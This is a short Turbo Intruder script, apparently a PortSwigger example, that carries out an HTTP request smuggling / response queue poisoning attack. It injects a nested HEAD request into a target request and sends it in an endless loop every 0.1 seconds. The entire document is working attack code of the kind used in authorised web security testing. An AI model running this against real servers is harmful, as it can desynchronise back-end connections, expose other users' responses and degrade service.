# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/tree/master/examples
from binascii import hexlify
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=5,
                           engine=Engine.BURP2
                           )

    nested_request = '''HEAD / HTTP/1.1
Host: hostname

X-NoResponseQueue-Poisoning'''
    attack = target.req.replace('FOO BAR AAH', nested_request)

    while True:
        engine.queue(attack)
        time.sleep(0.1)

def handleResponse(req, interesting):
    table.add(req)
